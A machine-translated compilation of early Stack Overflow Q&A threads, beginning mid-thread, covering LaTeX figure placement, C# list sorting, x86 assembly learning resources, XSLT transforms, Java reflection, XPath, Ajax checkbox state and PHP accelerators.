也许这可以总体上对您有所帮助...我只是讨厌 LaTeX 始终使一切都变得过于先进（灵活）的方式。此外，来源看起来真的很糟糕。它不会解决您最初的问题，但是由于更改每个图像的大小会更容易，您至少可以尝试...

```
% Easy image insert
%   use as \img{imagename}{caption}{label}
%   will insert image with with 70% of textwidth
%   change below for other width
\newcommand{\img}[3]{
    \begin{figure}[!ht]
        \centering
            \includegraphics[width=0.7\textwidth]{#1}
        \caption{#2}
        \label{fig:#3}
    \end{figure}
} 
```

\img{myimage}{有这个标题}{and_this_label}

标签会自动以 fig: 为前缀。祝你好运！/C

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2011-02-15T21:43:08.807

在图形环境中使用 [!t] 和 [!h]，而不是 [t]、[h] 等似乎会有所帮助，尽管我还没有找到一种万无一失的方法来在合理的地方获取大图像。有时它会在文档中途运行，有时则不会。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-10T22:27:14.967

有时，只需使用 includegraphics 语句的选项（文件名 aka 之前的方括号`\includegraphics[width=foo]{}`）更改宽度或高度即可。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-11-15T22:03:10.240

```
\begin{figure}[H!]
  \includegraphics{myfig}
  \caption{...}
  \label{fig:myfig}
\end{figure} 
```

用于`H!`表示您希望您的图片就在此处。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2021-09-18T13:05:41.690

```
\documentclass{article}
\usepackage{graphicx}

\begin{document}
 text
\begin{figure}[tbh]
\centering
\includegraphics[width=0.4 \textheight]{ & directory path of jpg. width defines the width of the page and one one can put in its place height which is text page height }

\caption{name of the jpg} 
\end{figure}
% it worked for me.

\end{document} 
```

# c# - 如何对列表进行排序 > 根据列表 字段数？

> ID：721577
> 
> 赞同：2
> 
> 时间：2009-04-06T14:01:27.783
> 
> 标签：c#, list, sorting

如何根据字段数对 List<List<string>> 进行排序？

该列表的结构类似于

```
a|b|c|d|eeee|rere|ewew|
ewqewq|ewew|
ewew|ewewewewew| 
```

按排序我想根据块数（asc/desc）来做

**编辑**

和`<list<list<string>> is "items"`我通过 items[0] 访问每个列表

这些项目[xx] 是一个列表，这意味着我希望他们将数组排序为

```
 a|b|c|d|eeee|rere|ewew|
    a|b|c|d|eeee|rere
    a|b|c|d|eeee 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-04-06T14:07:57.250

如果您不需要“就地”排序，您可以使用 LINQ 为您提供一个新的排序列表。

```
var sorted = oldList.OrderBy( l => l.Count ); 
```

否则，您需要编写自己的比较器，它接受两个列表并按其大小返回排序。

```
public class CountComparer : IComparer<List<string>>
{
    #region IComparer<List<string>> Members

    public int Compare( List<string> x, List<string> y )
    {
        return x.Count.CompareTo( y.Count );
    }

    #endregion
}

oldList.Sort( new CountComparer() ); 
```

或者，正如@Josh 指出的那样，您可以使用 lambda 表达式来做到这一点。

```
oldList.Sort( (a,b) => a.Count.CompareTo( b.Count ) ) 
```

如果比较相对简单或使用一次，IMO 后者效果很好，但实际类可能更可取，因为比较变得更加复杂，或者如果您需要在多个地方重复它。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T14:10:32.707

```
List<List<string>> list; // filled elsewhere
list.Sort((x,y) => x.Count.CompareTo(y.Count);); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T14:04:58.193

```
List<List<string>> strings = new List<List<string>>();

// add your strings

strings = new List<List<string>>(from str in strings orderby str.Count select str); 
```

显然，您可以调整它以适合您的场景，但这应该让您大致了解如何创建一个列表，该列表按另一个列表中特定字符串中的元素数量排序。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-06T14:10:03.423

您可以使用 sort 方法进行排序，方法是创建自己的比较器或给它一个类型的委托`Comparison<T>`。

```
ls.Sort((x, y) => x.Count.CompareTo(y.Count)); 
```

下面是一个示例，展示了如何使用 lambda 表达式进行比较。

# 编辑

反转排序的一个非常简单的方法是乘以负数 -1

```
ls.Sort((x, y) => -1 * x.Count.CompareTo(y.Count)); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-25T14:16:51.510

只是一个小的调整，同时也检查 null

```
 List<List<string>> listOfLists = new List<List<string>>();

        List<string> list1 = new List<string>();
        list1.Add("elem 1 1");
        list1.Add("elem 1 2");
        list1.Add("elem 1 3");

        List<string> list2 = new List<string>();
        list2.Add("elem 2 1");
        list2.Add("elem 2 2");
        list2.Add("elem 2 3");
        list2.Add("elem 2 4");

        listOfLists.Add(list1);
        listOfLists.Add(null); // list can contain nulls
        listOfLists.Add(list2);
        listOfLists.Add(null); // list can contain nulls 
```

当列表列表中有空列表时，您可能希望通过将 null.Count 解释为 -1 或 NOT 来使它们的优先级低于空列表

```
 int nullListElems = -1; 
        //int nullListElems = 0; 

        listOfLists.Sort((l1,l2)=> 
            l1 == null ? 
            nullListElems : 
            l1.Count.CompareTo(
                l2 == null ? 
                nullListElems : 
                l2.Count)); 
```

# linux - 在 Linux 平台上学习 x86 汇编的最佳方法是什么？

> ID：721583
> 
> 赞同：24
> 
> 时间：2009-04-06T14:02:17.123
> 
> 标签：linux, assembly, x86

我没有汇编编程的先验知识，并且想学习如何在 Linux 平台上编写 x86 汇编代码。但是，我很难找到一个好的资源来自学。

The Art of Assembly 这本书看起来不错，但它教 HLA。我对必须学习一种方式，然后重新学习它不感兴趣。RISC 架构似乎也有更好的汇编资源，但不幸的是我没有 RISC 处理器可以学习。有没有人有什么建议？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-04-06T15:03:53.497

[http://asm.sf.net](http://asm.sf.net)有一些关于 x86 以外的架构的资料。

如果你对 RISC 架构感兴趣，你可以在[Qemu](http://www.nongnu.org/qemu/about.html)上运行 Linux 。Qemu 模拟了几种 RISC 架构，如 PowerPC、ARM 和 MIPS。[您也许可以在此处](http://www.oszoo.org/wiki/index.php/Category:OS_images)找到可立即使用的 Qemu 硬盘映像。

另一种试验 RISC 架构的方法是使用 gdb 的内置模拟器。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-04-06T14:18:26.417

我发现[逐步汇编语言](http://www.amazon.co.uk/Assembly-Language-Step-Step-Programming/dp/0471375233/ref=sr_1_15?ie=UTF8&s=books&qid=1239027367&sr=8-15)是一个很好的资源。它的背面也有一个针对 Linux 程序集的部分。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T14:07:00.263

可能没有什么比[The Art of Assembly Language Programming](http://webster.cs.ucr.edu/)和该网站上的其他资源更好的了。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-08T03:03:48.890

学习汇编级编程实际上有两个部分：基本概念，然后是具体架构。如果您没有接触过 asm 编程，我强烈建议您首先使用简单的小型架构来了解基础知识，即使它可能并不直接适用于任何真正的硬件。如果很多人都指向一个特定的资源，比如“...的艺术”，再看一遍，用它来了解架构是什么，如何使用基本工具（asm、调试器、disasm 等）。

一旦这些都解决了，你就可以开始研究更高级的指令集了。x86 架构和指令集非常复杂，有许多晦涩难懂的方法来扭曲你的大脑——在你解决它之前先学习一些简单的东西。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-11T05:08:22.393

尽管我在学校认识的很多人讨厌这本书，但我还是会把它链接起来：

[http://www.amazon.com/Professional-Assembly-Language-Programmer/dp/0764579010](https://rads.stackoverflow.com/amzn/click/com/0764579010)

我使用这本书的主要原因是它在 Linux 上使用带有 GNU 汇编器的 x86。最后一点很有帮助，因为我不得不在我们学校的实验室中使用该汇编程序，如果您不知道 - 语法与英特尔语法不同。

另外，我只想补充一点，学习如何将高级语言编译成汇编语言确实帮助我继续前进。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-05-10T14:08:32.997

x86 汇编确实是一种 intel 语言，最好使用 intel 芯片和执行 DOS 的 windows 平台来学习

如果你有 WinXP 之类的东西，曾经有一个 DOS 解释器，它向用户展示 asm 的基础知识，并允许用户实时反转命令并调整代码，然后将代码组装成一个可以在口译员

它被称为“Ketman Interpreter”

它仅适用于 DOS asm，但它非常独特，因为它可以让您看到所有寄存器和标志发生了什么，并允许完全无知的人掌握逻辑

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-04-06T14:22:16.127

试试[http://www.emu8086.com](http://www.emu8086.com)，它是一个 Windows 托管的 8086 模拟器，带有一个汇编器和调试器。它带有一个教程。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-04-06T14:51:02.327

我从一本关于 8086 的书中学习了 x86 汇编程序（我现在不记得它的名字了……它显然很旧，而且是紫色的。如果你真的感兴趣，我回家后可以挖掘它） . 那只会教你 16 位的东西，对于更高级的 32 位东西，我在网上阅读了一些教程。我从来没有做过64位。至少一开始，您所针对的操作系统可能并不重要，因为您的级别太低了……BIOS 是您真正关心的全部。如果您无法访问测试系统，那么仿真器可能是一个不错的选择，正如其他人所提到的，但您也可以自己构建一个 8088 或 8086，而不会因分立部件而遇到太多麻烦。您可以轻松地在线找到教程和电路图。它应该花费不到 50 美元，这是一次很棒的学习体验——你

如果您不太喜欢 x86 汇编并且想学习 RISC，我推荐[Microchip](http://www.microchip.com) PIC 微控制器。您可以花不到 50 美元购买一个入门工具包（我拥有的 PICKit 1 甚至可以在 Linux 下工作）。他们有大量的文档和大量针对爱好者的第三方教程。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-04-11T04:52:32.977

别忘了拿一本[Guide-Assembly-Language-Programming-in-Linux](https://rads.stackoverflow.com/amzn/click/com/0387258973 "指南-汇编-语言-编程-Linux")书。

* * *

## 回答 #10

> 赞同：-3
> 
> 时间：2009-04-06T14:48:17.343

汇编语言编程的艺术

# php - mysql 用户定义函数是否适合签署 Amazon S3 url？

> ID：721585
> 
> 赞同：0
> 
> 时间：2009-04-06T14:02:36.140
> 
> 标签：php, mysql, amazon-s3, user-defined-functions

我需要使用重新创建以下 PHP 代码的用户定义函数从 mysql 数据库中检索结果 -

```
$signature = urlencode(base64_encode((hash_hmac("sha1", utf8_encode($string_to_sign), awsSecretKey, TRUE)))); 
```

UDF 能胜任这项工作吗？将 AWS 密钥存储在 UDF 中/将其作为变量传递有哪些安全隐患？

理想情况下，我希望能够做到这一点 -

```
$sql = "SELECT file_type, myPHPfunctionToSignFilename(file_name) ..."
$result = mysql_query($sql)
return ($result) 
```

但我认为 myPHPfunctionToSignFilename 需要是 MYSQL-UDF-FUNCTION ...

有什么建议么？

谢谢

斯蒂芬

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-21T12:57:52.053

为什么要在数据库中这样做？性能还是其他原因？我认为前一种情况无关紧要。

# c# - 如何从另一个 xml 元数据创建 xml？

> ID：721586
> 
> 赞同：1
> 
> 时间：2009-04-06T14:02:50.680
> 
> 标签：c#, .net, xml, xslt

我不确定标题是否清楚地解释了我的问题，是否会尝试包含尽可能多的细节。

我需要使用 Xslt 1 将下面的 xml 转换为格式正确的格式，以便我可以将其反序列化为 .net 类型。

源 XML

```
 <ax21:result type="test.ws.Result">
                <ax21:columnNames>fileName</ax21:columnNames>
                <ax21:columnNames>lockedState</ax21:columnNames>
                <ax21:columnNames>currentLockOwner</ax21:columnNames>
                <ax21:columnNames>UUID</ax21:columnNames>
                <ax21:resultData>Test1.doc</ax21:resultData>
                <ax21:resultData>true</ax21:resultData>
                <ax21:resultData>analyst</ax21:resultData>
                <ax21:resultData>f48f0450-9ecc-4a44-b063-898d9d72d112</ax21:resultData>
                <ax21:resultData>Test2.doc</ax21:resultData>
                <ax21:resultData>false</ax21:resultData>
                <ax21:resultData/>
                <ax21:resultData>f48f0450-9ecc-4a44-b063-898d9d72d112</ax21:resultData>
                <ax21:resultData>Test3.doc</ax21:resultData>
                <ax21:resultData>true</ax21:resultData>
                <ax21:resultData>analyst</ax21:resultData>
                <ax21:resultData>f48f0450-9ecc-4a44-b063-898d9d72d112</ax21:resultData>
                <ax21:resultData>Test4.doc</ax21:resultData>
                <ax21:resultData>false</ax21:resultData>
                <ax21:resultData/>
                <ax21:resultData>f48f0450-9ecc-4a44-b063-898d9d72d112</ax21:resultData>
            </ax21:result> 
```

目标 XML

```
<result>
    <item>
        <fileName>Test1.doc</fileName>
        <lockedState>true</lockedState>
        <currentLockOwner>analyst</currentLockOwner>
        <UUID>f48f0450-9ecc-4a44-b063-898d9d72d112</UUID>
    </item>
    <item>
        <fileName>Test2.doc</fileName>
        <lockedState>true</lockedState>
        <currentLockOwner>analyst</currentLockOwner>
        <UUID>f48f0450-9ecc-4a44-b063-898d9d72d112</UUID>
    </item>
    <item>
        <fileName>Test2.doc</fileName>
        <lockedState>true</lockedState>
        <currentLockOwner>analyst</currentLockOwner>
        <UUID>f48f0450-9ecc-4a44-b063-898d9d72d112</UUID>
    </item>
</result> 
```

这可以使用 xslt 完成吗？如果是，请发布链接或示例 xslt 供我尝试。

我正在使用 .net 2.0、c#、XSLT 1.0

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T19:37:35.120

**这是一个相当简短且简单的解决方案**：

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:ax21="my:ax21" exclude-result-prefixes="ax21"
 >
 <xsl:output omit-xml-declaration="yes" indent="yes"/>

  <xsl:variable name="vCols" select="/*/ax21:columnNames"/>
  <xsl:variable name="vNumCols" select="count($vCols)"/>

    <xsl:template match="ax21:result">
        <result>
          <xsl:apply-templates select=
           "ax21:resultData[position() mod $vNumCols = 1]"
           />
        </result>
    </xsl:template>

    <xsl:template match="ax21:resultData">
      <item>
        <xsl:apply-templates mode="create" select=
         "(.|following-sibling::ax21:resultData)
                               [not(position() > $vNumCols) ]
         "/>
      </item>
    </xsl:template>

    <xsl:template match="ax21:resultData" mode="create">
      <xsl:variable name="vPos" select="position()"/>
    <xsl:element name="{$vCols[$vPos]}">
          <xsl:value-of select="."/>
          <xsl:if test="not(text())">
            <xsl:value-of select=
             "(.| preceding-sibling::ax21:resultData)
                         [position() mod $vNumCols = $vPos]
                            [text()]
                                  [last()]
             "/>
          </xsl:if>
    </xsl:element>
    </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于以下 XML 文档时**：

```
<ax21:result type="test.ws.Result"
 xmlns:ax21="my:ax21"
>
    <ax21:columnNames>fileName</ax21:columnNames>
    <ax21:columnNames>lockedState</ax21:columnNames>
    <ax21:columnNames>currentLockOwner</ax21:columnNames>
    <ax21:columnNames>UUID</ax21:columnNames>
    <ax21:resultData>Test1.doc</ax21:resultData>
    <ax21:resultData>true</ax21:resultData>
    <ax21:resultData>analyst</ax21:resultData>
    <ax21:resultData>f48f0450-9ecc-4a44-b063-898d9d72d112</ax21:resultData>
    <ax21:resultData>Test2.doc</ax21:resultData>
    <ax21:resultData>false</ax21:resultData>
    <ax21:resultData/>
    <ax21:resultData>f48f0450-9ecc-4a44-b063-898d9d72d112</ax21:resultData>
    <ax21:resultData>Test3.doc</ax21:resultData>
    <ax21:resultData>true</ax21:resultData>
    <ax21:resultData>analyst</ax21:resultData>
    <ax21:resultData>f48f0450-9ecc-4a44-b063-898d9d72d112</ax21:resultData>
    <ax21:resultData>Test4.doc</ax21:resultData>
    <ax21:resultData>false</ax21:resultData>
    <ax21:resultData/>
    <ax21:resultData>f48f0450-9ecc-4a44-b063-898d9d72d112</ax21:resultData>
</ax21:result> 
```

**产生了想要的结果**：

```
<result>
   <item>
      <fileName>Test1.doc</fileName>
      <lockedState>true</lockedState>
      <currentLockOwner>analyst</currentLockOwner>
      <UUID>f48f0450-9ecc-4a44-b063-898d9d72d112</UUID>
   </item>
   <item>
      <fileName>Test2.doc</fileName>
      <lockedState>false</lockedState>
      <currentLockOwner>analyst</currentLockOwner>
      <UUID>f48f0450-9ecc-4a44-b063-898d9d72d112</UUID>
   </item>
   <item>
      <fileName>Test3.doc</fileName>
      <lockedState>true</lockedState>
      <currentLockOwner>analyst</currentLockOwner>
      <UUID>f48f0450-9ecc-4a44-b063-898d9d72d112</UUID>
   </item>
   <item>
      <fileName>Test4.doc</fileName>
      <lockedState>false</lockedState>
      <currentLockOwner>analyst</currentLockOwner>
      <UUID>f48f0450-9ecc-4a44-b063-898d9d72d112</UUID>
   </item>
</result> 
```

**说明**：

1.  为方便起见，列名及其编号收集在全局变量`$vCols`和`$vNumCols`.

2.  我们将模板应用于每个第 N 个`ax21:resultData`元素，其中`N mod $vNumCols = 1`. 每个这样的元素都开始一个新的`item`.

3.  每个`ax21:resultData`将成为 an 中第一个元素的元素都`item`与“no-mode”中的模板匹配。这只是创建包装元素并将另一个模板`item`应用于所有当前的 $vNumCols元素 -模式。`ax21:resultData``"create"`

4.  模式中的模板`"create"`只是创建一个元素，其名称是 中的第 n 个元素的值`$vCols`，其中`n`是`position()`应用模板的 current() 节点的值。

5.  最后，如果碰巧没有提供任何值，我们会（按倒序）获得相同类型元素的最新非空值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T15:14:40.710

这将是非常艰难的，如果不是不可能的话，要正确可靠地完成。

问题是：在许多和节点上没有关于它们的类型/位置是什么的索引或类型的指示 - 你或多或少地猜测......

如果至少有一个额外的属性，这将是一个不同的故事，比如等等——这样人们就可以以某种方式将它们联系在一起。

你有没有机会“按摩”一下原始数据？否则，我可能会说你必须在 C# 中加载它并解析它并进行大量手动处理才能得到你想要的。

马克

# iphone - 自定义 TableViewCell 高度被忽略

> ID：721593
> 
> 赞同：1
> 
> 时间：2009-04-06T14:04:44.233
> 
> 标签：iphone, objective-c, uitableview

我以前使用以下代码来更改使用自定义的单元格的大小`UITableViewCell`：

```
-(CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath {
    return 61;
} 
```

但是，我在不同的视图上创建了一个新视图，并且从未调用过上面的代码。

这`UITableViewCell`实际上是一个更通用视图的控件，但是所有其他类似的方法`cellForRowAtIndexPath`等都是

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T14:43:42.813

`delegate`除了`dataSource`. _ 它们是两个独立的协议，这很容易被忽视。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T16:04:05.240

Seems I needed this as well

```
- (UITableViewCell *) getCellContentView:(NSString *)cellIdentifier {

    CGRect CellFrame = CGRectMake(0, 0, 300, 60);

    UITableViewCell *cell = [[[UITableViewCell alloc] initWithFrame:CellFrame reuseIdentifier:cellIdentifier] autorelease];

    return cell;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T16:15:39.473

此外，您可以通过调整 UITableView（而不是 UITableViewCell）上的值在 IB 中完成同样的事情（我认为）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T19:46:00.357

heightForRowAtIndexPath 只是一个 UITableView 委托方法，而不是 UITableViewCell 方法。

因此，您将在委托类中拥有该代码，而不是在表格单元格代码中。

# java - 使用反射迭代类成员

> ID：721594
> 
> 赞同：3
> 
> 时间：2009-04-06T14:04:51.300
> 
> 标签：java, reflection

我有一个包含各种类型参数的类。我想遍历所有类型 A 成员，并运行特定函数（ A.doSomething() ）

这甚至无法编译：从字段到 XPathDataElement 的转换是非法的

```
Field[] fields = this.getClass().getDeclaredFields();
  for (Field field : fields) {
     if (field. getType().getName().equals(XPathDataElement.class.getName()))
        {               
                tmp = (XPathDataElement)field; // Doesn't compile
                sb.append(field.getName() + ":"); 
                tmp.update();
        }
    } 
```

谢谢！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-04-06T14:12:00.160

当你不说它有什么问题时，很难调试你的代码。

我可以看到两件事：

1.  无需比较字符串来确定字段的类型是否是正确的类。

    ```
    if (field.getType().equals(XPathDataElement.class)) 
    ```

    应该管用。

    **编辑：**史蒂夫·里德（Steve Reed）[指出](https://stackoverflow.com/questions/721594/use-reflection-to-iterate-over-class-members/721657#721657)，您不一定需要它是精确的`XPathDataElement`；子类也可以工作。要检查该字段是否可以被视为`XPathDataElement`，您应该使用[`Class.isAssignableFrom(Class)`](http://java.sun.com/javase/6/docs/api/java/lang/Class.html#isAssignableFrom(java.lang.Class)).

    ```
    if (XPathDataElement.class.isAssignableFrom(field.getType())) 
    ```

    将是代码。

2.  我想你真正的问题是如何反射地获取字段的值？如果是这样，那么[`Field.get(Object)`](http://java.sun.com/javase/6/docs/api/java/lang/reflect/Field.html#get(java.lang.Object))这就是你想要的。您传递给的对象是`get()`您要检索其字段的对象；如果您正在操作`this`（这是一种*强烈*的代码气味），那么您的代码将是

    ```
    XPathDataElement tmp = (XPathDataElement) field.get(this); 
    ```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T14:11:54.667

我强烈建议避免反思，除非你真的需要它。

只需将代码写出来：

```
this.x.doSomething();
this.y.doSomething();
this.z.doSomething(); 
```

或者，如果您喜欢：

```
for (A a : new A[] {
    this.x, this.y, this.z
}) {
    a.doSomething();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T14:16:38.353

几个指针：

1.  比较类是否相等，而不是它们的名称。

    field.getType().equals(XPathDataElement.class)

2.  或者更好的是，用于`isAssignableFrom(java.lang.Class)`处理类将返回类型声明为您正在寻找的子类的情况

    XPathDataElement.class.isAssignableFrom(field.getType())

3.  您正在迭代**fields**，而不是**method**。您的问题使我假设您想要后者，如果是这样，请使用：

    this.getClass().getDeclaredMethods()

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T14:09:02.913

您似乎没有为您在循环中`obj`投射的内容分配任何内容。`XPathDataElement`

你可能想做这样的事情：

```
tmp = (XPathDataElement)field.get(this); 
```

# c# - 如何：搜索 XML 子节点

> ID：721598
> 
> 赞同：1
> 
> 时间：2009-04-06T14:05:10.503
> 
> 标签：c#, xml, xpath

给定一段 Xml 如下所示。我将如何编写 XPATH 查询来获取“key”值具有特定值的“leaf2”子项的值（比如 2）

我在 C# .NET 中工作。目前，我只是在寻找使用 SelectNodes 获取密钥的 Xpath，找到正确的值然后导航回 Leaf2。

```
<root>
    <child>
        <anotherChild>
           <key>1</key>
        </anotherChild>
        <leaf1>X</leaf1>
        <leaf2>Y</leaf2>
        <leaf3></leaf3>
    </child>
    <child>
        <anotherChild>
           <key>2</key>
        </anotherChild>
        <leaf1>A</leaf1>
        <leaf2>B</leaf2>
        <leaf3></leaf3>
    </child>
</root> 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-04-06T14:12:19.847

你要：

```
/root/child[anotherChild/key = '2']/leaf2 
```

这就是说，“获取名为 的元素`leaf2`，其父级为`child`，其祖父级为`root`，其子级在哪里`child`被过滤，子级名为`anotherChild`，`key`其值为`2`。”

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T14:24:01.473

或者，也许更灵活一点，因为它不假设祖父是根

```
//child/anotherChild/key[text()="2"]/../../leaf2 
```

“找到带有文本 2 的密钥，父母 anotherChild 和祖父母，去祖父母（即孩子，然后找到叶子 2”

# ajax - 如何维护由 Ajax 刷新的页面上的复选框状态？

> ID：721599
> 
> 赞同：3
> 
> 时间：2009-04-06T14:05:12.093
> 
> 标签：ajax, dojo, checkbox, struts2

我的应用程序中有一个 html 表，它显示了系统中运行的各种作业的状态。每个作业都有一个与之相关的状态，例如用于运行作业的漩涡状 gif。新作业旁边有一个复选框，允许用户选择和启动相关作业。

该表是一个 struts2 自动刷新的 div (sx:div)，它每隔几秒刷新一次以反映作业当前发生的情况。

问题是当 div 刷新时，我失去了复选框的状态。

有没有一种优雅的方式来维持他们的状态？我可以选择在完成 ajax 刷新后使用标签中内置的 dojo 主题系统调用一些 javascript，但我不确定什么是处理它的最佳方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T14:17:06.513

我对 struts 不是很熟悉，所以请接受我的建议，了解它的价值。

我看到有两种方法可以解决这个问题。

第一个（可能也是最简单的）是将一个事件添加到复选框，该复选框将选中状态存储在数组或对象 onchange 中。然后，在从 ajax 刷新回调时，恢复这些状态。

第二种方法将要求Ajax刷新要么作为帖子执行，以便复选框被提交给服务器，或者在选中复选框时具有单独的Ajax action。使用这些选项中的任何一个，ajax 刷新都可以在渲染时“知道”哪些复选框要渲染为选中状态。

如果您决定使用第一名，则 javascript 并不是很困难，特别是如果您碰巧使用了一个好的库（jquery 等）。

# php - php加速器评测

> ID：721600
> 
> 赞同：7
> 
> 时间：2009-04-06T14:05:20.363
> 
> 标签：php, caching, performance, accelerator

1) 你能推荐我一个 PHP V5.2.6 的 PHP 加速器吗？
2) 您是否知道最近对这些模块（Alternative PHP Cache、eAccelerator、XCache、Zend Optimizer、Zend Platform、ionCube PHP Accelerator、Turck MMCache、Nusphere PhpExpress）的任何测试比较/审查？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-04-06T14:28:30.697

[**APC**](http://www.php.net/manual/en/book.apc.php) — PECL 中包含的标准选项，预打包在大多数 Linux 发行版中，默认捆绑在 PHP6 中。作为奖励，它可以用作[数据缓存](http://www.php.net/manual/en/function.apc-store.php)（类似于本地内存缓存）。

eAccelerator 很受欢迎，有一段时间它是[最快的](http://2bits.com/articles/benchmarking-drupal-with-php-op-code-caches-apc-eaccelerator-and-xcache-compared.html)字节码缓存。但是速度上的差异不足以证明选择它而不是 APC 是合理的。

图尔克 MMcache——死了。eAccelerator 是从它衍生出来的。

ionCube——死了。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-04-06T14:20:02.793

[APC](http://www.php.net/apc)几乎是标准选择。它计划包含在 PHP 6 核心中。与大多数其他候选人不同，它稳定且免费。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T14:22:14.423

下面是其中三个的比较，APC、Zend 和 XCache：

[http://blog.digitalstruct.com/2007/12/23/php-accelerators-apc-vs-zend-vs-xcache-with-zend-framework/](http://blog.digitalstruct.com/2007/12/23/php-accelerators-apc-vs-zend-vs-xcache-with-zend-framework/)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-06T14:28:32.693

APC 易于安装，开箱即用，可用作操作码缓存和数据缓存。在我看来，简单的选择。

# java - 面向初学者的 Java 编程

> ID：721604
> 
> 赞同：7
> 
> 时间：2009-04-06T14:05:55.900
> 
> 标签：java

我是瑞士一所大学的注册学生，因此我知道编程是 Electrotechnik（电气工程）的一部分，这是我将要从事的领域。

如何在没有他人帮助的情况下以最简单的方式学习 Java 编程？

我通过学习书籍尝试过，但我发现这并不容易，尤其是一个人做。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-04-06T14:15:38.573

对于对编程一无所知的人来说，仅仅阅读教程不会为你做这件事。最好**下载**一个[编辑器](http://www.jedit.org/)并使用您使用的任何[教程](http://java.sun.com/docs/books/tutorial/getStarted/)实际**编写程序。**

> 关于编程的事情，你*写得*越多，你就越擅长它。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-04-06T14:10:01.630

Grüß、Thomas，如果您没有学过*任何*编程，可能会有点难以开始，但是[Sun Java 教程](http://java.sun.com/docs/books/tutorial/)是一个很好的起点。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-04-06T14:08:52.740

试试[Java 教程](http://java.sun.com/docs/books/tutorial/)。它将引导您完成实际示例，并提供您可以在各种 IDE 中试用的代码。我通常觉得这比看书更容易。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-04-06T14:15:17.437

如果你能超越这种风格，[Head First Java很好。](http://books.google.com/books?id=5VTBuvfZDyoC&printsec=toc&dq=head+first+java&sig=_TxpWY_9OyNrBO2ucSh5VJ49kRs#PPP1,M1)有些人喜欢它，有些人讨厌它（我没有找到介于两者之间的任何地方）。有趣的是，我发现喜欢这种风格的人是有更多经验的人（不是 100% 正确），但这本书是针对那些没有经验的人。

如果你喜欢这种风格，这是一本好书，如果你讨厌这种风格，还有其他风格，只要让 use 知道（正如其他人所问的那样），你是 100% 的编程新手，如果不是，你还知道哪些其他语言。另外，您在语言的哪些部分特别有问题？

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-04-06T14:38:04.463

事实上，你必须学习两件事，编程和Java。

我会推荐[用 Java 思考](http://www.mindview.net/Books/TIJ/)的书(Bruce Eckel)，当前版本是第 4 版，但您可以免费下载第 3 版...

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-04-07T00:07:32.083

试试Yakov Fain的**免费**书[《儿童、父母和祖父母 Java 编程》](http://myflex.org/books/java4kids/java4kids.htm)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-04-06T14:09:48.043

到目前为止，您尝试过哪些书？当我开始有人向我推荐“Sprechen Sie Java？” 我的 Hanspeter Mössenböck 当时实际上对我来说效果很好（在开始使用计算机科学之前没有写过一行代码）。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-04-06T14:11:54.713

您可以在 Javapassion尝试免费[课程。](http://www.javapassion.com/javaintro/)

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-04-06T14:42:53.050

如果您想快速学习，您可以选择另一个选择，您可以阅读麻省理工学院的开放课件，例如[Java 入门课程](http://ocw.mit.edu/OcwWeb/Electrical-Engineering-and-Computer-Science/6-092January--IAP--2006/CourseHome/)。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-04-06T15:27:39.713

看看[BlueJ](http://www.bluej.org/)。它旨在教Java

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-04-06T14:34:16.360

1.  准备好自己并完成一个“Hello World”教程，接下来还有很多。

2.  一旦您知道您可以编译 Java 程序并查看输出。想想一个小程序。它可能就像将摄氏度转换为华氏度一样简单，反之亦然。构建它，使用谷歌和你需要的任何其他资源来找到你需要做的事情。一旦你开始运行，想想更复杂的事情。构建它，继续这样做一段时间。

